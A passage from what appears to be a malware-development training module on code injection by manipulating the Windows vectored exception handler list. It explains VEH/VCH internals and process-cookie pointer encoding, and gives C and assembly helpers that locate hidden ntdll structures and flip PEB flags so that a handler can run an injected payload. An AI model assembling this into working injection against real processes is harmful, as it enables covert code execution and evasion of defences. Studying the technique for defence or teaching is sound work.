<p>Vectored Continue Handler (VCH) - Executed after a VEH has processed an exception, returned <code>EXCEPTION_CONTINUE_EXECUTION</code> and just before the program resumes normal execution. To register a VCH, one can call the <a href="https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredcontinuehandler" target="_blank">AddVectoredContinueHandler</a> API.</p>
</li>
</ul>
<p>While VEH handlers give you control as soon as an exception is 
triggered, VCH handlers are designed for scenarios where you might need 
additional processing or cleanup tasks after standard exception handling
 has finished but before regular execution continues. Typical uses of 
VCH handlers include performing additional logging or auditing after 
exceptions, cleaning up resources that may have been modified by 
previous handlers, and implementing advanced debugging or 
instrumentation techniques, as they allow for inspection or modification
 of the program state right before continuing execution.</p>
<h3 id="toc-heading-4">The Vectored Handler List</h3>
<p>Both VEH and VCH handlers are stored internally in a linked list named <code>LdrpVectorHandlerList</code> that resides in the <code>.mrdata</code> section, also known as the <code>Mutable Read Only Data</code> of NTDLL. The <code>LdrpVectorHandlerList</code> linked list is a list of the following structure:</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_VECTORED_HANDLER_LIST</span>
<span class="token punctuation">{</span>
    PVOID                   LockVEH<span class="token punctuation">;</span>
    VECTORED_HANDLER_ENTRY<span class="token operator">*</span> FirstVEH<span class="token punctuation">;</span>
    VECTORED_HANDLER_ENTRY<span class="token operator">*</span> LastVEH<span class="token punctuation">;</span>
    PVOID                   LockVCH<span class="token punctuation">;</span>
    VECTORED_HANDLER_ENTRY<span class="token operator">*</span> FirstVCH<span class="token punctuation">;</span>
    VECTORED_HANDLER_ENTRY<span class="token operator">*</span> LastVCH<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>The members of the structure are explained below:</p>
<ul>
<li>
<p><code>LockVEH</code> - <a href="https://learn.microsoft.com/en-us/windows/win32/Sync/slim-reader-writer--srw--locks" target="_blank">Slim reader/writer lock</a> used to manage concurrent access to the VEH linked list.</p>
</li>
<li>
<p><code>FirstVEH</code> - Pointer to the first entry in the VEH linked list.</p>
</li>
<li>
<p><code>LastVEH</code> - Pointer to the last entry in the VEH linked list.</p>
</li>
<li>
<p><code>LockVCH</code> - <a href="https://learn.microsoft.com/en-us/windows/win32/Sync/slim-reader-writer--srw--locks" target="_blank">Slim reader/writer lock</a> used to manage concurrent access to the VCH linked list.</p>
</li>
<li>
<p><code>FirstVCH</code> - Pointer to the first entry in the VCH linked list.</p>
</li>
<li>
<p><code>LastVCH</code> - Pointer to the last entry in the VCH linked list.</p>
</li>
</ul>
<h3 id="toc-heading-5">Vectored Handler Entries</h3>
<p>Each vectored entry stored in <code>LdrpVectorHandlerList</code> is represented as <code>VECTORED_HANDLER_ENTRY</code> which is declared as the following:</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_VECTORED_HANDLER_ENTRY</span>
<span class="token punctuation">{</span>
    LIST_ENTRY  Entry<span class="token punctuation">;</span>
    PVOID       Refs<span class="token punctuation">;</span>
    PVOID       Unused<span class="token punctuation">;</span>
    PVOID       VectoredHandler<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>The members of the <code>VECTORED_HANDLER_ENTRY</code> structure are explained below:</p>
<ul>
<li>
<p><code>Entry</code> - Pointers to forward and backwards links.</p>
</li>
<li>
<p><code>Refs</code> - Pointer to a pointer-sized variable that holds the reference count (must be 1).</p>
</li>
<li>
<p><code>VectoredHandler</code> - Encoded pointer to the handler function registered. Encoded pointers are explained in the following section.</p>
</li>
</ul>
<p>By default, vectored handler entries are stored on the process's 
heap. In the image below, we compare the output from WinDbg to Process 
Hacker to show that the address <code>000001ebd8318800</code> is located in a RW committed heap address</p>
<img src="69_files/nocfg-entries.png" style="margin:auto" width="1200px">
<p>However, when CFG is enabled in a process and it registers a vectored handler, it will call <a href="https://doxygen.reactos.org/d5/d55/vectoreh_8c.html#ac8c67f59400a1c0c04d343a61d1fd40f" target="_blank">RtlpAddVectoredHandler</a> that will check if <code>LdrpMrdataHeap</code> is present by calling another function named <code>LdrEnsureMrdataHeapExists</code>. This function, as the name suggests, checks if <code>LdrpMrdataHeap</code> is already present.</p>
<p>If <code>LdrpMrdataHeap</code> is not present, it will allocate 64kb of memory with <code>NtAllocateVirtualMemory</code>, create <code>LdrpMrdataHeap</code> by calling <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtlcreateheap" target="_blank">RtlCreateHeap</a>, and then make it "Read-Only" by calling <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FHeap%20Memory%2FRtlProtectHeap.html" target="_blank">RtlProtectHeap</a>.</p>
<p>Registered vectored handlers will then be placed into an 8kb region within the allocated 64kb memory allocated previously.</p>
<img src="69_files/cfg-entry.png" style="margin:auto" width="1200px">
<blockquote>
<p>Note that on newer 24H2 builds, this chunk can also be 24kb instead of 8kb.</p>
</blockquote>
<h3 id="toc-heading-6">Implementing Code Injection Logic</h3>
<p>In order for us to utilize VEH entries manipulation for code 
execution, we will first need to insert an entry or modify an existing 
one in <code>LdrpVectorHandlerList</code> that will reference our 
payload. A VEH triggering event will invoke our entry after that, 
effectively executing our payload. However, while attempting to do so, 
we will run into CFG and the <em>encoded pointers</em> issue, which is discussed later in the module.</p>
<p>For a more stable and robust implementation, we will attempt to replicate the <code>AddVectoredExceptionHandler</code> and <code>AddVectoredContinueHandler</code> APIs to fully control the registration process.</p>
<h3 id="toc-heading-7">Process Cookies</h3>
<p>A process cookie in Windows is a per-process secret value used to 
obfuscate pointer values for security. It is essentially a random 
integer generated at process initialization (or on first use) and unique
 to each process. The Windows OS produces this cookie using various 
unpredictable inputs (e.g. system timers, counters, interrupt times) to 
ensure randomness.</p>
<p>Windows provides APIs like <a href="https://learn.microsoft.com/en-us/previous-versions/bb432254(v=vs.85)" target="_blank">EncodePointer</a> and <a href="https://learn.microsoft.com/en-us/previous-versions/bb432242(v=vs.85)" target="_blank">DecodePointer</a> to hide actual pointer values by encoding them with the processs cookie. For cross-process pointer encoding and decoding, <a href="https://learn.microsoft.com/en-us/previous-versions/dn877135(v=vs.85)" target="_blank">EncodePointerRemote</a> and <a href="https://learn.microsoft.com/en-us/previous-versions/dn877133(v=vs.85)" target="_blank">DecodePointerRemote</a> are also provided. Internally, these APIs call the NTDLL routines <a href="https://ntdoc.m417z.com/rtlencodepointer" target="_blank">RtlEncodePointer</a>, <a href="https://ntdoc.m417z.com/rtldecodepointer" target="_blank">RtlDecodePointer</a>, <a href="https://ntdoc.m417z.com/rtlencoderemotepointer" target="_blank">RtlEncodePointerRemote</a> and <a href="https://ntdoc.m417z.com/rtldecoderemotepointer" target="_blank">RtlDecodePointerRemote</a> respectively, which implement the actual mechanism.</p>
<p>The encoding scheme is simple but effective: it combines the pointer 
value with the secret cookie (usually via an XOR operation and bit 
rotation). In other words, to encode a pointer, the OS will XOR the 
pointer with the cookie and then rotate the bits by an amount derived 
from the cookie (for example, rotating right by the lower 6 bits of the 
cookie). The decode operation reverses this (rotate in the opposite 
direction and XOR with the same cookie) to retrieve the original 
pointer. This means the encoded pointer is process-specific and only 
code running in the same process and cookie can decode it properly. If 
an attacker reads an encoded function pointer from a process, it will be
 meaningless without the cookie. Likewise, if malware tries to overwrite
 a protected pointer with a raw address, the program will attempt to 
decode it and end up with an incorrect value, leading to a crash instead
 of a successful exploit</p>
<p>Under the hood, all of the aforementioned functions retrieve the 
process cookie in whose context the pointer needs to be valid. A 
combination of bitwise <code>AND</code>, <code>XOR</code>, <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/rotl-rotl64-rotr-rotr64?view=msvc-170" target="_blank">__rotr64 and __rotl64</a> are used for encoding/decodng purposes.</p>
<h3 id="toc-heading-8">Obtaining a Process's Cookie</h3>
<p>To retrieve a process's cookie, one can call the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess" target="_blank">NtQueryInformationProcess</a> syscall with the <code>ProcessCookie</code> information class. The cookie is stored in a <code>DWORD</code>
 variable as shown in the following snippet. Furthermore, it is 
important to note that a process cookie can only be obtained if the 
process handle is fetched with the <code>PROCESS_ALL_ACCESS</code> flag.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token function">NtQueryInformationProcess</span><span class="token punctuation">(</span>
	hProcess<span class="token punctuation">,</span>      <span class="token comment">// Handle with PROCESS_ALL_ACCESS</span>
	ProcessCookie<span class="token punctuation">,</span> <span class="token comment">// InformationClass for cookie retrieval</span>
	<span class="token operator">&amp;</span>dwCookie<span class="token punctuation">,</span>     <span class="token comment">// Pointer to a DWORD variable that receives the cookie</span>
	<span class="token keyword">sizeof</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token operator">&amp;</span>retLength
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>With a process cookie, encoding/decoding a pointer manually can be achieved with the following functions:</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">PVOID <span class="token function">DecodePointers</span><span class="token punctuation">(</span>PVOID ptr<span class="token punctuation">,</span> DWORD dwCookie<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RotateRight64</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>ptr<span class="token punctuation">,</span> <span class="token number">0x40</span> <span class="token operator">-</span> <span class="token punctuation">(</span>dwCookie <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> dwCookie<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

PVOID <span class="token function">EncodePointers</span><span class="token punctuation">(</span>PVOID ptr<span class="token punctuation">,</span> DWORD dwCookie<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RotateLeft64</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>ptr <span class="token operator">^</span> dwCookie<span class="token punctuation">,</span> <span class="token number">0x40</span> <span class="token operator">-</span> <span class="token punctuation">(</span>dwCookie <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h3 id="toc-heading-9">The GetVectoredHandlerList Function</h3>
<p>In order to manipulate the VEH list (<code>LdrpVectorHandlerList</code>)
 and have it execute our own payload, we need first to fetch it. 
Unfortunately, there is no documented or undocumented function to 
retrieve the <code>LdrpVectorHandlerList</code> list from a process, however, one can find it being mentioned in several internal functions, as shown below:</p>
<img src="69_files/m1-list-refs.png" style="margin:auto" width="1200px">
<p>Therefore we will use one of these functions as a reference to start the search for <code>LdrpVectorHandlerList</code>'s address. For that, we will construct a function named <code>GetVectoredHandlerList</code> that uses <code>RtlRemoveVectoredExceptionHandler</code>'s pointer as a reference to start the search. Within <code>RtlRemoveVectoredExceptionHandler</code>, <code>LdrpVectorHandlerList</code> can be seen in the following instruction:</p>
<img src="69_files/ldrpvectorhandlerlist1.png" style="margin:auto" width="1200px">
<p>Where it computes and stores the pointer to <code>LdrpVectorHandlerList</code> in the <code>r12</code> register. Therefore, our <code>GetVectoredHandlerList</code> function should search for the <code>lea r12, LdrpVectorHandlerList</code> instruction, shown in the image above, to find the address of the <code>LdrpVectorHandlerList</code> list. The function searches for the <code>258d4c</code> byte sequence, which represents the instruction in Little-Endian.</p>
<img src="69_files/ldrpvectorhandlerlist2.png" style="margin:auto" width="1200px">
<p><code>GetVectoredHandlerList</code> accepts the following parameters:</p>
<ul>
<li>
<p><code>hNtdll</code> - The base address of <code>ntdll.dll</code>.</p>
</li>
<li>
<p><code>pLdrpVectorHandlerList</code> - A pointer to a <code>PVOID</code> variable that will receive the address of <code>LdrpVectorHandlerList</code>.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">GetVectoredHandlerList</span><span class="token punctuation">(</span>IN HMODULE hNtdll<span class="token punctuation">,</span> OUT PVOID<span class="token operator">*</span> pLdrpVectorHandlerList<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token comment">// Reference function</span>
	ULONG64 ptr <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG64<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token string">"RtlRemoveVectoredExceptionHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ptr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error Obtaining Reference Function - GetProcAddress Failed With Error : %ld \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>BYTE<span class="token operator">*</span><span class="token punctuation">)</span>ptr <span class="token operator">!=</span> <span class="token number">0xcc</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token comment">// "jmp"</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>BYTE<span class="token operator">*</span><span class="token punctuation">)</span>ptr <span class="token operator">==</span> <span class="token number">0xe9</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

			<span class="token comment">// Following the 'jmp'</span>
			ptr <span class="token operator">=</span> ptr <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ptr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token comment">// "lea r12,[ntdll!LdrpVectorHandlerList]"</span>
			<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>ULONG<span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffff</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x258d4c</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				ptr <span class="token operator">=</span> ptr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token comment">// Extract the 4-byte displacement and get ntdll!LdrpVectorHandlerList</span>
			<span class="token operator">*</span>pLdrpVectorHandlerList <span class="token operator">=</span> ptr <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ptr <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		ptr <span class="token operator">=</span> ptr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-10">The GetLdrProtectMrdata Function</h4>
<p>When manually modifying the <code>LdrpVectoredHandlerList</code> located in the <code>.mrdata</code> section, it is essential to first obtain the <code>LdrpMrdataLock</code> lock.  This lock is a <a href="https://learn.microsoft.com/en-us/windows/win32/Sync/slim-reader-writer--srw--locks" target="_blank">slim reader/writer lock</a> designed to provide exclusive access to the <code>.mrdata</code>
 segment during modifications. Acquiring this lock guarantees that no 
other threads can interfere with the data while we perform our edits, 
thus ensuring the integrity of the modifications and preventing 
potential race conditions.</p>
<p>Fortunately, there is a function called <code>LdrProtectMrdata</code> that automates this process. Not only does it handle acquiring the lock, but it also wraps around the <code>NtProtectVirtualMemory</code> API to adjust the memory protections for <code>.mrdata</code> appropriately. Internally used by the Windows loader during process initialization, <code>LdrProtectMrdata</code>
 is also utilized by other native or internal APIs to ensure that memory
 regions critical to process operation are safely protected during 
dynamic modifications.</p>
<p>The function <code>GetLdrProtectMrdata</code> is employed to locate the address of <code>LdrProtectMrdata</code> in memory by using <code>RtlDeleteFunctionTable</code> as a reference point.</p>
<img src="69_files/call_ldrprotectmrdata.png" style="margin:auto" width="1200px">
<p>It accepts the following parameters:</p>
<ul>
<li>
<p><code>hNtdll</code> - The base address of <code>ntdll.dll</code>.</p>
</li>
<li>
<p><code>pLdrProtectMrdata</code> - A pointer to a <code>PVOID</code> variable that will receive the address of <code>LdrProtectMrdata</code>.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">GetLdrProtectMrdata</span><span class="token punctuation">(</span>IN HMODULE hNtdll<span class="token punctuation">,</span> OUT PVOID<span class="token operator">*</span> pLdrProtectMrdata<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	BYTE<span class="token operator">*</span> ptr <span class="token operator">=</span> <span class="token punctuation">(</span>BYTE<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token string">"RtlDeleteFunctionTable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ptr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">PRINT_WINAPI_ERR</span><span class="token punctuation">(</span><span class="token string">"GetProcAddress"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token comment">// Start of "call ntdll!LdrProtectMrdata"</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>ptr <span class="token operator">==</span> <span class="token number">0xe8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

			<span class="token keyword">int</span> offset <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ptr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token comment">// Retrn "ntdll!LdrProtectMrdata"</span>
			<span class="token operator">*</span>pLdrProtectMrdata <span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token punctuation">(</span>ptr <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		ptr<span class="token operator">++</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-11">The GetLdrpMrdataHeap Function</h4>
<p>To ensure compatibility between our custom implementations of <code>AddVectoredExceptionHandler</code> and <code>AddVectoredContinueHandler</code> and the original functions, it is essential to use <code>LdrpMrdataHeap</code>, a heap that is responsible for managing the memory for vectored handlers. <code>LdrpMrdataHeap</code>
 plays a critical role when CFG is enabled. Furthermore, in scenarios 
where a vectored handler is registered either before or after your 
custom implementation is active, <code>LdrpMrdataHeap</code> helps maintain a consistent memory layout and ensures that handlers are managed correctly.</p>
<p>Our custom versions of the <code>AddVectoredExceptionHandler</code> and <code>AddVectoredContinueHandler</code> functions must consider all cases, especially those involving CFG, and using <code>LdrpMrdataHeap</code> automatically handles these nuances. Essentially, <code>LdrpMrdataHeap</code>
 abstracts away the underlying complexities of memory management related
 to vectored handlers under CFG, making the custom implementations 
function seamlessly alongside the original API behavior.</p>
<p>To locate the address of <code>LdrpMrdataHeap</code>, the function <code>GetLdrpMrdataHeap</code> is constructed. This function searches for <code>LdrpMrdataHeap</code> by using <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtladdfunctiontable" target="_blank">RtlAddFunctionTable</a> as a reference point.</p>
<img src="69_files/getldrpmrdataheap.png" style="margin:auto" width="1200px">
<p>The function accepts the following parameters:</p>
<ul>
<li>
<p><code>hNtdll</code> - The base address of <code>ntdll.dll</code>.</p>
</li>
<li>
<p><code>pLdrpMrdataHeap</code> - A pointer to a <code>PVOID</code> variable that will receive the address of <code>LdrpMrdataHeap</code>.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">GetLdrpMrdataHeap</span><span class="token punctuation">(</span>IN HMODULE hNtdll<span class="token punctuation">,</span> OUT PVOID<span class="token operator">*</span> pLdrpMrdataHeap<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token comment">// Get reference function</span>
	ULONG64 ptr <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG64<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token string">"RtlAddFunctionTable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ptr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">PRINT_WINAPI_ERR</span><span class="token punctuation">(</span><span class="token string">"GetProcAddress"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Scan till a "mov rcx, [ntdll!LdrpMrdataHeap]"</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>ULONG<span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffff</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x0d8b48</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		ptr <span class="token operator">=</span> ptr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// extract the 4-byte displacement and get "ntdll!LdrpMrdataHeap"</span>
	<span class="token operator">*</span>pLdrpMrdataHeap <span class="token operator">=</span> ptr <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ptr <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-12">The GetLdrEnsureMrdataHeapExists Function</h4>
<p>When CFG is enabled, Windows calls <code>LdrEnsureMrdataHeapExists</code> to guarantee that the <code>LdrpMrdataHeap</code>
 is properly initialized and available. This function ensures that the 
memory management infrastructure for vectored exception and continue 
handlers is set up before any handler modifications occur, which is 
critical in CFG-enabled environments to maintain security and system 
stability.</p>
<p>The <code>GetLdrEnsureMrdataHeapExists</code> function shown below, searches for the location of <code>LdrEnsureMrdataHeapExists</code> using <code>RtlAddFunctionTable</code> as a reference point.</p>
<img src="69_files/getldrensuremrdataheapexists.png" style="margin:auto" width="1200px">
<p><code>GetLdrEnsureMrdataHeapExists</code> accepts the following parameters:</p>
<ul>
<li>
<p><code>hNtdll</code> - The base address of <code>ntdll.dll</code>.</p>
</li>
<li>
<p><code>pLdrEnsureMrdataHeapExists</code> - A pointer to a <code>PVOID</code> variable that will receive the location of <code>LdrEnsureMrdataHeapExists</code>.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">GetLdrEnsureMrdataHeapExists</span><span class="token punctuation">(</span>IN HMODULE hNtdll<span class="token punctuation">,</span> OUT PVOID<span class="token operator">*</span> pLdrEnsureMrdataHeapExists<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	BYTE<span class="token operator">*</span> ptr <span class="token operator">=</span> <span class="token punctuation">(</span>BYTE<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token string">"RtlAddFunctionTable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ptr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">PRINT_WINAPI_ERR</span><span class="token punctuation">(</span><span class="token string">"GetProcAddress"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token comment">// Start of "call ntdll!LdrEnsureMrdataHeapExists"</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>ptr <span class="token operator">==</span> <span class="token number">0xe8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

			<span class="token keyword">int</span> offset <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ptr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token comment">// Return "ntdll!LdrEnsureMrdataHeapExists"</span>
			<span class="token operator">*</span>pLdrEnsureMrdataHeapExists <span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token punctuation">(</span>ptr <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		ptr<span class="token operator">++</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h4 id="toc-heading-13">The FlipBit Function</h4>
<p>When a process registers a VEH or VCH, Windows updates the <code>PEB.CrossProcessFlags</code> field by setting the corresponding <code>ProcessUsingVEH</code> or <code>ProcessUsingVCH</code>
 bits. This action informs the operating system that the process is 
actively utilizing vectored handlers, which ensures that any exceptions 
encountered are correctly forwarded to these handlers. By setting these 
flags, Windows can accurately manage exception routing and guarantee 
that the registered handlers are invoked, thereby playing a critical 
role in the processs exception handling and overall security framework.</p>
<p>The <code>FlipBit</code> function, as its name implies, toggles one of these bits using the provided bitmask.</p>
<div class="code-toolbar"><pre class="language-asm" tabindex="0"><code class="language-asm">FlipBit proc

	xor rax, rax
	xor rdx, rdx
	mov rdx, qword ptr gs:[60h]		; get the address of our PEB
	bsf rax, rcx					; get the bit position based on the bitmask provided
	btc dword ptr [rdx+50h], eax	; flip the bit in CrossProcessFlags
	ret

FlipBit endp
